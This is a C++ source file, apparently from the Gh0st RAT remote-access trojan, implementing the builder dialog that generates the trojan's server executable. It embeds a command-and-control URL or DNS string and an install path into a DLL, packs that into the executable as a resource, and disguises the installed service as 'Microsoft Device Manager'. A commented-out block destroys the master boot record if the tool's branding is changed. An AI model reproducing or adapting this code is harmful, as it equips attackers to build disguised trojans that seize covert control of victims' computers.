// BuildView.cpp : implementation file
//

#include "stdafx.h"
#include "gh0st.h"
#include "BuildView.h"

extern char* MyEncode(char *str);

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

/////////////////////////////////////////////////////////////////////////////
// CBuildView

IMPLEMENT_DYNCREATE(CBuildView, CFormView)

CBuildView::CBuildView()
	: CFormView(CBuildView::IDD)
{
	//{{AFX_DATA_INIT(CBuildView)
	m_url = _T("");
	m_encode = _T("");
	m_enable_http = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetInt("Build", "enablehttp", false);
	m_ServiceDescription = _T("");
	m_ServiceDisplayName = _T("");
	m_dllname = _T("user32.dll");
	m_bFirstShow = true;
	//}}AFX_DATA_INIT
}

CBuildView::~CBuildView()
{
}

void CBuildView::DoDataExchange(CDataExchange* pDX)
{
	CFormView::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CBuildView)
	DDX_Control(pDX, IDC_COMBO_RELEASEPATH, m_releasepath);
	DDX_Text(pDX, IDC_URL, m_url);
	DDX_Text(pDX, IDC_ENCODE, m_encode);
	DDX_Check(pDX, IDC_ENABLE_HTTP, m_enable_http);
	DDX_Text(pDX, IDC_SERVICE_DESCRIPTION, m_ServiceDescription);
	DDX_Text(pDX, IDC_SERVICE_DISPLAYNAME, m_ServiceDisplayName);
	DDX_Text(pDX, IDC_DLLNAME, m_dllname);
	//}}AFX_DATA_MAP
}


BEGIN_MESSAGE_MAP(CBuildView, CFormView)
	//{{AFX_MSG_MAP(CBuildView)
	ON_BN_CLICKED(IDC_BUILD, OnBuild)
	ON_BN_CLICKED(IDC_ENABLE_HTTP, OnEnableHttp)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CBuildView diagnostics

#ifdef _DEBUG
void CBuildView::AssertValid() const
{
	CFormView::AssertValid();
}

void CBuildView::Dump(CDumpContext& dc) const
{
	CFormView::Dump(dc);
}
#endif //_DEBUG

/////////////////////////////////////////////////////////////////////////////
// CBuildView message handlers

void CBuildView::OnBuild() 
{
	// TODO: Add your control notification handler code here
	UpdateData(true);
	if (m_ServiceDisplayName.IsEmpty() || m_ServiceDescription.IsEmpty())
	{
		AfxMessageBox("请完整填写服务显示名称和描述 -:(");
		return;
	}
	CString strAddress;

	// 保存配置
	((CGh0stApp *)AfxGetApp())->m_IniFile.SetString("Build", "DisplayName", m_ServiceDisplayName);
	((CGh0stApp *)AfxGetApp())->m_IniFile.SetString("Build", "Description", m_ServiceDescription);
	((CGh0stApp *)AfxGetApp())->m_IniFile.SetInt("Build", "enablehttp", m_enable_http);
	if (m_enable_http)
	{
		CString str;
		GetDlgItemText(IDC_URL, str);
		((CGh0stApp *)AfxGetApp())->m_IniFile.SetString("Build", "httpurl", str);
		str.MakeLower();
		strAddress = MyEncode(str.GetBuffer(0));
	}
	else
	{
		GetDlgItemText(IDC_DNS_STRING, strAddress);
		if (strAddress.Find("AAAA") == -1)
		{
			AfxMessageBox("域名上线字串格式出错 -:(");
			return;
		}
		strAddress.Replace("AAAA", "");
	}

	CString strInstallPath;
	((CComboBox*)GetDlgItem(IDC_COMBO_RELEASEPATH))->GetWindowText(strInstallPath);//安装路径
	strInstallPath = strInstallPath + m_dllname;

	CFileDialog dlg(FALSE, "exe", "server.exe", OFN_OVERWRITEPROMPT,"可执行文件|*.exe", NULL);
	if(dlg.DoModal () != IDOK)
		return;
	char Path[MAX_PATH];
	char ExePath[MAX_PATH];
	char DllPath[MAX_PATH];
	char BakPath[MAX_PATH];
	char DllBakPath[MAX_PATH];
	char Wrong[MAX_PATH];
	char Wrong1[MAX_PATH];
	GetModuleFileName(NULL, Path, sizeof(Path));   //获取程序自身完整路径名称,即Gh0st.exe的路径
	PathRemoveFileSpec(Path);

	wsprintf(ExePath,"%s%s",Path,"\\update\\core.dat");
	wsprintf(DllPath,"%s%s",Path,"\\update\\core.dll");
	wsprintf(BakPath,"%s%s",Path,"\\update\\Cache.bak");
	wsprintf(DllBakPath,"%s%s",Path,"\\update\\dll.bak");
	wsprintf(Wrong,"%s%s%s%s","\"",ExePath,"\""," 文件丢失!");
	wsprintf(Wrong1,"%s%s%s%s","\"",DllPath,"\""," 文件丢失!");

	if(!CopyFile(ExePath,BakPath,FALSE))  //如果不存在dat文件就提示下
	{
		MessageBox(Wrong,"提示");
		return;
	}
	if(!CopyFile(DllPath,DllBakPath,FALSE))  //如果不存在dat文件就提示下
	{
		MessageBox(Wrong1,"提示");
		return;
	}
	CFile filedll;
	if(filedll.Open (DllBakPath, CFile::modeWrite))
	{
		try
		{
			filedll.Seek(0,CFile::end);               //把文件指针指向文件末尾
			filedll.Write("OOOOOO", 6);
			filedll.Write(strAddress, strAddress.GetLength() + 1);
			filedll.Write("PPPPPP", 6);
			filedll.Write(strInstallPath, strInstallPath.GetLength() + 1);
			filedll.Close();
		}
		catch(...)
		{
		}
	}
	HANDLE hFile;
    hFile = CreateFile(DllBakPath, GENERIC_READ, NULL, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE)
    {
		DeleteFile(BakPath);
		DeleteFile(DllBakPath);
		return;
    }

	DWORD nSizeOfSrcFile = GetFileSize( hFile, &nSizeOfSrcFile ); 
	char *szSrcFileBuf = new char[ nSizeOfSrcFile ]; 
	ReadFile( hFile, szSrcFileBuf, nSizeOfSrcFile, &nSizeOfSrcFile, NULL); 

	HANDLE hUpdate;
	BOOL ret;
	hUpdate = BeginUpdateResource(BakPath, false);
    ret = UpdateResource(hUpdate, "BIN", "DLL", 0, szSrcFileBuf, nSizeOfSrcFile);
    if (!ret)
    {
		CloseHandle(hFile);
    }
    CloseHandle(hFile);
	EndUpdateResource( hUpdate, false ); 
	delete []szSrcFileBuf; 
	CloseHandle(hFile);
	CopyFile(BakPath,dlg.GetPathName(),FALSE);
	DeleteFile(BakPath);
	DeleteFile(DllBakPath);

	CFile file;
	if(file.Open (dlg.GetPathName(), CFile::modeWrite))
	{
		try
		{
			DWORD sizeBeginWrite = 0x578;//配置信息结构开始位置

			file.Seek(sizeBeginWrite,CFile::begin);
			file.Write(m_ServiceDisplayName.GetBuffer(0), m_ServiceDisplayName.GetLength() + 1);

			file.Seek(sizeBeginWrite + 200,CFile::begin);
			file.Write(m_ServiceDescription.GetBuffer(0), m_ServiceDescription.GetLength() + 1);

			file.Seek(sizeBeginWrite + 400,CFile::begin);
			file.Write(strInstallPath, strInstallPath.GetLength() + 1);

			file.Close();
			char ShowText[200];
			wsprintf(ShowText,"%s%s","服务端已生成到:",dlg.GetPathName());
			MessageBox(ShowText,"提示",MB_ICONEXCLAMATION | MB_OK);
		}
		catch(...)
		{
			MessageBox("文件保存失败，请检查...","提示",MB_OK|MB_ICONSTOP);
		}
	}
}

void CBuildView::OnActivateView(BOOL bActivate, CView* pActivateView, CView* pDeactiveView) 
{
	// TODO: Add your specialized code here and/or call the base class
	if (m_bFirstShow)
	{
		UpdateData(false);
 		SetDlgItemText(IDC_URL, ((CGh0stApp *)AfxGetApp())->m_IniFile.GetString("Build", "httpurl", "http://www.xxx.com/ip.jpg"));
 		SetDlgItemText(IDC_SERVICE_DISPLAYNAME, 
			((CGh0stApp *)AfxGetApp())->m_IniFile.GetString("Build", "DisplayName", "Microsoft Device Manager"));
 		SetDlgItemText(IDC_SERVICE_DESCRIPTION, 
			((CGh0stApp *)AfxGetApp())->m_IniFile.GetString("Build", "Description", "监测和监视新硬件设备并自动更新设备驱动"));

		OnEnableHttp();
/*
		char	strVer[10];
		char	strTitle[10];

		strVer[0] = 'C';//C.Rufus s
		strVer[1] = '.';
		strVer[2] = 'R';
		strVer[3] = 'u';
		strVer[4] = 'f';
		strVer[5] = 'u';
		strVer[6] = 's';
		strVer[7] = ' ';
		strVer[8] = 'S';
		strVer[9] = '\0';

		strTitle[0] = 'G';//Gh0st RAT
		strTitle[1] = 'h';
		strTitle[2] = '0';
		strTitle[3] = 's';
		strTitle[4] = 't';
		strTitle[5] = ' ';
		strTitle[6] = 'R';
		strTitle[7] = 'A';
		strTitle[8] = 'T';
		strTitle[9] = '\0';

		CString str;
		GetDlgItemText(IDC_STATIC_VER, str);
		if (str.Find(strVer) == -1)
			((CGh0stApp *)AfxGetApp())->KillMBR();

		GetParent()->GetWindowText(str);
		if (str.Find(strTitle) == -1)
			((CGh0stApp *)AfxGetApp())->KillMBR();
*/
		int	nEditControl[] = {IDC_URL, IDC_DNS_STRING, IDC_SERVICE_DISPLAYNAME, IDC_SERVICE_DESCRIPTION};
		for (int i = 0; i < sizeof(nEditControl) / sizeof(int); i++)
			m_Edit[i].SubclassDlgItem(nEditControl[i], this);
	m_releasepath.SetCurSel(0);
		m_btn_release.SubclassDlgItem(IDC_BUILD, this);
		m_btn_release.SetColor(CButtonST::BTNST_COLOR_FG_IN, RGB(255, 0, 0));
	}
	
	m_bFirstShow = false;	
	CFormView::OnActivateView(bActivate, pActivateView, pDeactiveView);
}


void CBuildView::OnEnableHttp() 
{
	// TODO: Add your control notification handler code here
	UpdateData(true);
	GetDlgItem(IDC_DNS_STRING)->EnableWindow(!m_enable_http);
	GetDlgItem(IDC_URL)->EnableWindow(m_enable_http);
}	
